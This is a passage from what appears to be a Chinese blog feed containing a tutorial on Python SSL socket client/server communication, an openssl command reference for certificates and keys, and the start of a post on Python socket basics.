输出证书信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;#客户端消息#：客户端成功验证服务端证书，已成功连接，服务端证书信息如下&#x27;</span>)<br>    pprint.pprint(ssl_sock.getpeercert())<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 通过一个死循环不断接收用户输入，并发送给服务器</span><br>        inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;#客户端消息#：请输入要发送的信息： &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inp:  <span class="hljs-comment"># 防止输入空信息，导致异常退出</span><br>            <span class="hljs-keyword">continue</span><br>        ssl_sock.sendall(inp.encode())<br>        <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&quot;exit&quot;</span>:  <span class="hljs-comment"># 如果输入的是‘exit’，表示断开连接</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#客户端消息#：结束通信！&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        server_reply = ssl_sock.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#客户端消息#：来自%s的服务端向你发来信息：%s&quot;</span> % (ip_port, server_reply))<br>    s.close()  <span class="hljs-comment"># 关闭连接</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server</span>():</span><br>    ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>    <span class="hljs-comment"># 创建了一个 SSL上下文,ssl.PROTOCOL_TLS表示选择客户端和服务器均支持的最高协议版本</span><br>    context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br>    <span class="hljs-comment"># 加载一个私钥及对应的证书</span><br>    context.load_cert_chain(certfile=<span class="hljs-string">&quot;server.crt&quot;</span>, keyfile=<span class="hljs-string">&quot;server.key&quot;</span>)<br><br>    sk = socket.socket()  <span class="hljs-comment"># 创建套接字</span><br>    sk.bind(ip_port)  <span class="hljs-comment"># 绑定服务地址</span><br>    sk.listen(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 监听连接请求</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;#服务端消息#：启动socket服务，等待客户端连接...&#x27;</span>)<br><br>    connect_sock, address = sk.accept()  <span class="hljs-comment"># 等待连接，此处自动阻塞</span><br>    <span class="hljs-comment"># 包装一个现有的 Python socket,并返回一个ssl socket,server_side为true表示为服务器行为，默认为false则表示客户端</span><br>    ssl_connect_sock = context.wrap_socket(connect_sock, server_side=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 一个死循环，直到客户端发送‘exit’的信号，才关闭连接</span><br>        client_data = ssl_connect_sock.recv(<span class="hljs-number">1024</span>).decode()  <span class="hljs-comment"># 接收信息</span><br>        <span class="hljs-comment"># print(client_data)</span><br>        <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:  <span class="hljs-comment"># 判断是否退出连接</span><br>            sk.close()  <span class="hljs-comment"># 关闭连接</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#服务端消息#：客户端已结束通信！&quot;</span>)<br>            exit(<span class="hljs-string">&quot;通信结束&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#服务端消息#：来自%s的客户端向你发来信息：%s&quot;</span> % (address, client_data))<br>        ssl_connect_sock.sendall(<span class="hljs-string">&#x27;服务器已经收到你的信息&#x27;</span>.encode())  <span class="hljs-comment"># 回馈信息给客户端</span><br><br><br>thread_server = threading.Thread(target=server)<br>thread_client = threading.Thread(target=client)<br>thread_server.start()<br>thread_client.start()<br>thread_server.join()<br>thread_client.join()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;退出主线程&quot;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="运行结果"><a class="markdownIt-Anchor" href="#运行结果"></a> 运行结果</h3><p><img src="/posts/cf547d62/image-20211230093921353.png" alt="image-20211230093921353"></p><p><img src="/posts/cf547d62/image-20211230093900981.png" alt="image-20211230093900981"></p><h1 id="附录"><a class="markdownIt-Anchor" href="#附录"></a> 附录</h1><h2 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h2><h3 id="证书"><a class="markdownIt-Anchor" href="#证书"></a> 证书</h3><p>总的来说，证书是公钥/私钥系统的一个组成部分。</p><p>在一个证书中包含有两个主体的相关信息。</p><ul><li><p>其包含目标方的名称和目标方的公钥。</p></li><li><p>还包含由第二个主体颁发方所发布的声明：目标方的身份与他们所宣称的一致，包含的公钥也确实是目标方的公钥。 颁发方的声明使用颁发方的私钥进行签名，该私钥的内容只有颁发方自己才知道。 但是，任何人都可以找到颁发方的公钥，用它来解密这个声明，并将其与证书中的其他信息进行比较来验证颁发方声明的真实性。 证书还包含有关其有效期限的信息。 这被表示为两个字段，即 “notBefore” 和 “notAfter”。</p><p><img src="/posts/cf547d62/image-20211230101906909.png" alt="image-20211230101906909"></p></li></ul><p>在 Python 中应用证书时，客户端或服务器可以用证书来证明自己的身份。 还可以要求网络连接的另一方提供证书，提供的证书可以用于验证以满足客户端或服务器的验证要求。 如果验证失败，连接尝试可被设置为引发一个异常。 验证是由下层的 OpenSSL 框架来自动执行的；应用程序本身不必关注其内部的机制。 但是应用程序通常需要提供一组证书以允许此过程的发生。</p><h3 id="ca-证书"><a class="markdownIt-Anchor" href="#ca-证书"></a> CA 证书</h3><p>如果想要对连接的另一方的证书进行验证，客户端必须提供一个 “CA 证书” 文件，其实就是一个CA机构的公钥，用这个公钥去验证被CA机构的颁发的目标网站的证书，这个证书相当于被CA机构的私钥签名过。所以如果通过验证，则表明该网站被CA信任，那么客户端就可以相信它。</p><p>验证原理可以解释如下：</p><ul><li><p>客户端信任CA</p></li><li><p>CA信任目标网站</p></li><li><p>客户端可以信任目标网站</p></li></ul><p>验证逻辑如下</p><p><strong>服务端端</strong></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># 创建了一个 SSL上下文,ssl.PROTOCOL_TLS表示选择客户端和服务器均支持的最高协议版本</span><br>context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># 加载一个私钥及对应的证书</span><br>context.load_cert_chain(<span class="hljs-attribute">certfile</span>=<span class="hljs-string">&quot;server.crt&quot;</span>, <span class="hljs-attribute">keyfile</span>=<span class="hljs-string">&quot;server.key&quot;</span>)<br></code></pre></div></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 创建了一个 SSL上下文,ssl.PROTOCOL_TLS表示选择客户端和服务器均支持的最高协议版本</span><br><span class="hljs-built_in">context</span> = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># 加载一组用于验证对方网站证书的CA证书</span><br><span class="hljs-built_in">context</span>.load_verify_locations(<span class="hljs-string">&quot;cert.pem&quot;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="自签名证书"><a class="markdownIt-Anchor" href="#自签名证书"></a> 自签名证书</h3><p>下面的命令会生成一个自签名证书，因为实验中一般不会去真的CA机构给服务器签名，所以我们可以用自签名证书来自己制作一个CA证书</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">openssl req -<span class="hljs-keyword">new</span> -x509 -days <span class="hljs-number">365</span> -nodes -<span class="hljs-keyword">out</span> cert.pem -keyout key.pem -subj <span class="hljs-string">&quot;/C=CN/ST=province/L=city/O=company/OU=/CN=YourWebSiteName&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="python-socket编程"><a class="markdownIt-Anchor" href="#python-socket编程"></a> python socket编程</h2><p>参见博主之前写过<a href="https://zino00.github.io/posts/79900945/">socket编程</a></p><h2 id="openssl命令参考"><a class="markdownIt-Anchor" href="#openssl命令参考"></a> openssl命令参考</h2><p>这部分参考自<a href="https://blog.csdn.net/gengxiaoming7/article/details/78505107">openssl详解</a></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">1. openssl list-standard-commands(标准命令)<br>    1) asn1parse: asn1parse用于解释用ANS.1语法书写的语句(ASN一般用于定义语法的构成) <br>    2) ca: ca用于CA的管理 <br>    openssl ca [options]:<br>        2.1) -selfsign<br>        使用对证书请求进行签名的密钥对来签发证书。即&quot;自签名&quot;，这种情况发生在生成证书的客户端、签发证书的CA都是同一台机器(也是我们大多数实验中的情况)，我们可以使用同一个<br>密钥对来进行&quot;自签名&quot;<br>        2.2) -in file<br>        需要进行处理的PEM格式的证书<br>        2.3) -out file<br>        处理结束后输出的证书文件<br>        2.4) -cert file<br>        用于签发的根CA证书<br>        2.5) -days arg <br>        指定签发的证书的有效时间<br>        2.6) -keyfile arg   <br>        CA的私钥证书文件<br>        2.7) -keyform arg<br>        CA的根私钥证书文件格式:<br>            2.7.1) PEM<br>            2.7.2) ENGINE <br>        2.8) -key arg   <br>        CA的根私钥证书文件的解密密码(如果加密了的话)<br>        2.9) -config file    <br>        配置文件<br>    example1: 利用CA证书签署请求证书<br>    openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key  <br><br>    3) req: X.509证书签发请求(CSR)管理<br>    openssl req [options] &lt;infile &gt;outfile<br>        3.1) -inform arg<br>        输入文件格式<br>            3.1.1) DER<br>            3.1.2) PEM<br>        3.2) -outform arg   <br>        输出文件格式<br>            3.2.1) DER<br>            3.2.2) PEM<br>        3.3) -in arg<br>        待处理文件<br>        3.4) -out arg<br>        待输出文件<br>        3.5) -passin        <br>        用于签名待生成的请求证书的私钥文件的解密密码<br>        3.6) -key file<br>        用于签名待生成的请求证书的私钥文件<br>        3.7) -keyform arg  <br>            3.7.1) DER<br>            3.7.2) NET<br>            3.7.3) PEM<br>        3.8) -new<br>        新的请求<br>        3.9) -x509          <br>        输出一个X509格式的证书 <br>        3.10) -days<br>        X509证书的有效时间  <br>        3.11) -newkey rsa:bits <br>        生成一个bits长度的RSA私钥文件，用于签发  <br>        3.12) -[digest]<br>        HASH算法<br>            3.12.1) md5<br>            3.12.2) sha1<br>            3.12.3) md2<br>            3.12.4) mdc2<br>            3.12.5) md4<br>        3.13) -config file   <br>        指定openssl配置文件<br>        3.14) -text: text显示格式<br>    example1: 利用CA的RSA密钥创建一个自签署的CA证书(X.509结构) <br>    openssl req -new -x509 -days 3650 -key server.key -out ca.crt <br>    example2: 用server.key生成证书签署请求CSR(这个CSR用于之外发送待CA中心等待签发)<br>    openssl req -new -key server.key -out server.csr<br>    example3: 查看CSR的细节<br>    openssl req -noout -text -in server.csr<br><br>    4) genrsa: 生成RSA参数<br>    openssl genrsa [args] [numbits]<br>        [args]<br>        4.1) 对生成的私钥文件是否要使用加密算法进行对称加密:<br>            4.1.1) -des: CBC模式的DES加密<br>            4.1.2) -des3: CBC模式的DES加密<br>            4.1.3) -aes128: CBC模式的AES128加密<br>            4.1.4) -aes192: CBC模式的AES192加密<br>            4.1.5) -aes256: CBC模式的AES256加密<br>        4.2) -passout arg: arg为对称加密(des、des、aes)的密码(使用这个参数就省去了console交互提示输入密码的环节)<br>        4.3) -out file: 输出证书私钥文件<br>        [numbits]: 密钥长度<br>    example: 生成一个1024位的RSA私钥，并用DES加密(密码为1111)，保存为server.key文件<br>    openssl genrsa -out server.key -passout pass:1111 -des3 1024 <br><br>    5) rsa: RSA数据管理<br>    openssl rsa [options] &lt;infile &gt;outfile<br>        5.1) -inform arg<br>        输入密钥文件格式:<br>            5.1.1) DER(ASN1)<br>            5.1.2) NET<br>            5.1.3) PEM(base64编码格式)<br>         5.2) -outform arg<br>         输出密钥文件格式<br>            5.2.1) DER<br>            5.2.2) NET<br>            5.2.3) PEM<br>        5.3) -in arg<br>        待处理密钥文件 <br>        5.4) -passin arg<br>        输入这个加密密钥文件的解密密钥(如果在生成这个密钥文件的时候，选择了加密算法了的话)<br>        5.5) -out arg<br>        待输出密钥文件<br>        5.6) -passout arg  <br>        如果希望输出的密钥文件继续使用加密算法的话则指定密码 <br>        5.7) -des: CBC模式的DES加密<br>        5.8) -des3: CBC模式的DES加密<br>        5.9) -aes128: CBC模式的AES128加密<br>        5.10) -aes192: CBC模式的AES192加密<br>        5.11) -aes256: CBC模式的AES256加密<br>        5.12) -text: 以text形式打印密钥key数据 <br>        5.13) -noout: 不打印密钥key数据 <br>        5.14) -pubin: 检查待处理文件是否为公钥文件<br>        5.15) -pubout: 输出公钥文件<br>    example1: 对私钥文件进行解密<br>    openssl rsa -in server.key -passin pass:111 -out server_nopass.key<br>    example:2: 利用私钥文件生成对应的公钥文件<br>    openssl rsa -in server.key -passin pass:111 -pubout -out server_public.key<br><br>    6) x509:<br>    本指令是一个功能很丰富的证书处理工具。可以用来显示证书的内容，转换其格式，给CSR签名等X.509证书的管理工作<br>    openssl x509 [args]    <br>        6.1) -inform arg<br>        待处理X509证书文件格式<br>            6.1.1) DER<br>            6.1.2) NET<br>            6.1.3) PEM<br>        6.2) -outform arg   <br>        待输出X509证书文件格式<br>            6.2.1) DER<br>            6.2.2) NET<br>            6.2.3) PEM<br>        6.3) -in arg <br>        待处理X509证书文件<br>        6.4) -out arg       <br>        待输出X509证书文件<br>        6.5) -req            <br>        表明输入文件是一个&quot;请求签发证书文件(CSR)&quot;，等待进行签发 <br>        6.6) -days arg       <br>        表明将要签发的证书的有效时间 <br>        6.7) -CA arg <br>        指定用于签发请求证书的根CA证书 <br>        6.8) -CAform arg     <br>        根CA证书格式(默认是PEM) <br>        6.9) -CAkey arg      <br>        指定用于签发请求证书的CA私钥证书文件，如果这个option没有参数输入，那么缺省认为私有密钥在CA证书文件里有<br>        6.10) -CAkeyform arg  <br>        指定根CA私钥证书文件格式(默认为PEM格式)<br>        6.11) -CAserial arg   <br>        指定序列号文件(serial number file)<br>        6.12) -CAcreateserial <br>        如果序列号文件(serial number file)没有指定，则自动创建它     <br>    example1: 转换DER证书为PEM格式<br>    openssl x509 -in cert.cer -inform DER -outform PEM -out cert.pem<br>    example2: 使用根CA证书对&quot;请求签发证书&quot;进行签发，生成x509格式证书<br>    openssl x509 -req -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt<br>    example3: 打印出证书的内容<br>    openssl x509 -in server.crt -noout -text <br><br>    7) crl: crl是用于管理CRL列表 <br>    openssl crl [args]<br>        7.1) -inform arg<br>        输入文件的格式<br>            7.1.1) DER(DER编码的CRL对象)<br>            7.1.2) PEM(默认的格式)(base64编码的CRL对象)<br>        7.2) -outform arg<br>        指定文件的输出格式 <br>            7.2.1) DER(DER编码的CRL对象)<br>            7.2.2) PEM(默认的格式)(base64编码的CRL对象)<br>        7.3) -text: <br>        以文本格式来打印CRL信息值。<br>        7.4) -in filename<br>        指定的输入文件名。默认为标准输入。<br>        7.5) -out filename<br>        指定的输出文件名。默认为标准输出。<br>        7.6) -hash<br>        输出颁发者信息值的哈希值。这一项可用于在文件中根据颁发者信息值的哈希值来查询CRL对象。<br>        7.7) -fingerprint<br>        打印CRL对象的标识。<br>        7.8) -issuer<br>        输出颁发者的信息值。<br>        7.9) -lastupdate<br>        输出上一次更新的时间。<br>        7.10) -nextupdate<br>        打印出下一次更新的时间。 <br>        7.11) -CAfile file<br>        指定CA文件，用来验证该CRL对象是否合法。 <br>        7.12) -verify<br>        是否验证证书。        <br>    example1: 输出CRL文件，包括(颁发者信息HASH值、上一次更新的时间、下一次更新的时间)<br>    openssl crl -in crl.crl -text -issuer -hash -lastupdate –nextupdate <br>    example2: 将PEM格式的CRL文件转换为DER格式<br>    openssl crl -in crl.pem -outform DER -out crl.der  <br><br>    8) crl2pkcs7: 用于CRL和PKCS#7之间的转换 <br>    openssl crl2pkcs7 [options] &lt;infile &gt;outfile<br>    转换pem到spc<br>    openssl crl2pkcs7 -nocrl -certfile venus.pem -outform DER -out venus.spc<br>    https://www.openssl.org/docs/apps/crl2pkcs7.html<br><br>    9) pkcs12: PKCS#12数据的管理<br>    pkcs12文件工具，能生成和分析pkcs12文件。PKCS#12文件可以被用于多个项目，例如包含Netscape、 MSIE 和 MS Outlook<br>    openssl pkcs12 [options] <br>    http://blog.csdn.net/as3luyuan123/article/details/16105475<br>    https://www.openssl.org/docs/apps/pkcs12.html<br><br>    10) pkcs7: PCKS#7数据的管理 <br>    用于处理DER或者PEM格式的pkcs#7文件<br>    openssl pkcs7 [options] &lt;infile &gt;outfile<br>    http://blog.csdn.net/as3luyuan123/article/details/16105407<br>    https://www.openssl.org/docs/apps/pkcs7.html<br> <br>2. openssl list-message-digest-commands(消息摘要命令)<br>    1) dgst: dgst用于计算消息摘要 <br>    openssl dgst [args]<br>        1.1) -hex           <br>        以16进制形式输出摘要<br>        1.2) -binary        <br>        以二进制形式输出摘要<br>        1.3) -sign file    <br>        以私钥文件对生成的摘要进行签名<br>        1.4) -verify file    <br>        使用公钥文件对私钥签名过的摘要文件进行验证 <br>        1.5) -prverify file  <br>        以私钥文件对公钥签名过的摘要文件进行验证<br>        verify a signature using private key in file<br>        1.6) 加密处理<br>            1.6.1) -md5: MD5 <br>            1.6.2) -md4: MD4         <br>            1.6.3) -sha1: SHA1 <br>            1.6.4) -ripemd160<br>    example1: 用SHA1算法计算文件file.txt的哈西值，输出到stdout<br>    openssl dgst -sha1 file.txt<br>    example2: 用dss1算法验证file.txt的数字签名dsasign.bin，验证的private key为DSA算法产生的文件dsakey.pem<br>    openssl dgst -dss1 -prverify dsakey.pem -signature dsasign.bin file.txt<br><br>    2) sha1: 用于进行RSA处理<br>    openssl sha1 [args] <br>        2.1) -sign file<br>        用于RSA算法的私钥文件 <br>        2.2) -out file<br>        输出文件爱你<br>        2.3) -hex   <br>        以16进制形式输出<br>        2.4) -binary<br>        以二进制形式输出  <br>    example1: 用SHA1算法计算文件file.txt的HASH值,输出到文件digest.txt<br>    openssl sha1 -out digest.txt file.txt<br>    example2: 用sha1算法为文件file.txt签名,输出到文件rsasign.bin，签名的private key为RSA算法产生的文件rsaprivate.pem<br>    openssl sha1 -sign rsaprivate.pem -out rsasign.bin file.txt<br><br>3. openssl list-cipher-commands (Cipher命令的列表)<br>    1) aes-128-cbc<br>    2) aes-128-ecb<br>    3) aes-192-cbc<br>    4) aes-192-ecb<br>    5) aes-256-cbc<br>    6) aes-256-ecb<br>    7) base64<br>    8) bf<br>    9) bf-cbc<br>    10) bf-cfb<br>    11) bf-ecb<br>    12) bf-ofb<br>    13) cast<br>    14) cast-cbc<br>    15) cast5-cbc<br>    16) cast5-cfb<br>    17) cast5-ecb<br>    18) cast5-ofb<br>    19) des<br>    20) des-cbc<br>    21) des-cfb<br>    22) des-ecb<br>    23) des-ede<br>    24) des-ede-cbc<br>    25) des-ede-cfb<br>    26) des-ede-ofb<br>    27) des-ede3<br>    28) des-ede3-cbc<br>    29) des-ede3-cfb<br>    30) des-ede3-ofb<br>    31) des-ofb<br>    32) des3<br>    33) desx<br>    34) rc2<br>    35) rc2-40-cbc<br>    36) rc2-64-cbc<br>    37) rc2-cbc<br>    38) rc2-cfb<br>    39) rc2-ecb<br>    40) rc2-ofb<br>    41) rc4<br>    42) rc4-40<br></code></pre></div></td></tr></table></figure><h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h2><p><a href="https://docs.python.org/zh-cn/3/library/ssl.html#module-ssl">python SSL官方文档</a></p><p><a href="https://blog.csdn.net/gengxiaoming7/article/details/78505107">openssl详解</a></p><p><a href="https://blog.csdn.net/sinat_41901875/article/details/103600299">关于SSL通信以及python的实现</a></p><p><a href="https://www.feistyduck.com/library/openssl-cookbook/">一本openssl官网推荐的openssl命令参考书</a></p>]]></content>
    
    
    <categories>
      
      <category>Project</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>网络通信</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>socket编程python实现</title>
    <link href="/posts/79900945/"/>
    <url>/posts/79900945/</url>
    
    <content type="html"><![CDATA[<h1 id="socket基本概念"><a class="markdownIt-Anchor" href="#socket基本概念"></a> socket基本概念</h1><p>socket是基于C/S架构的，也就是说进行socket网络编程，通常需要编写两个py文件，一个服务端，一个客户端。</p><p>首先，导入Python中的socket模块： import socket</p><p>Python中的socket通信逻辑如下图所示：</p><p><img src="/posts/79900945/1762677-20201007160746044-1258982359.png" alt="image.png-58.5kB"></p><hr><p>在Python中，<code>import socket</code>后，用<code>socket.socket()</code>方法来创建套接字，语法格式如下：</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">socket.socket(<span class="hljs-attribute">family</span>=AF_INET, <span class="hljs-attribute">type</span>=SOCK_STREAM, <span class="hljs-attribute">proto</span>=0, <span class="hljs-attribute">fileno</span>=None)<br></code></pre></div></td></tr></table></figure><p>参数说明：</p><ul><li>family: 套接字家族，可以使<code>AF_UNIX</code>或者<code>AF_INET</code>。</li><li>type: 套接字类型，根据是面向连接的还是非连接分为<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code>，也就是TCP和UDP的区别。</li><li>protocol: 一般不填默认为0。</li></ul><p>直接socket.socket()，则全部使用默认值。</p><p>下面是具体的参数定义：</p><table><thead><tr><th>socket类型</th><th>描述</th></tr></thead><tbody><tr><td>socket.AF_UNIX</td><td>只能够用于单一的Unix系统进程间通信</td></tr><tr><td>socket.AF_INET</td><td>IPv4</td></tr><tr><td>socket.AF_INET6</td><td>IPv6</td></tr><tr><td>socket.SOCK_STREAM</td><td>流式socket , for TCP</td></tr><tr><td>socket.SOCK_DGRAM</td><td>数据报式socket , for UDP</td></tr><tr><td>socket.SOCK_RAW</td><td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</td></tr><tr><td>socket.SOCK_SEQPACKET</td><td>可靠的连续数据包服务</td></tr><tr><td>创建TCP Socket：</td><td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</td></tr><tr><td>创建UDP Socket：</td><td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td></tr></tbody></table><p>通过<code>s = 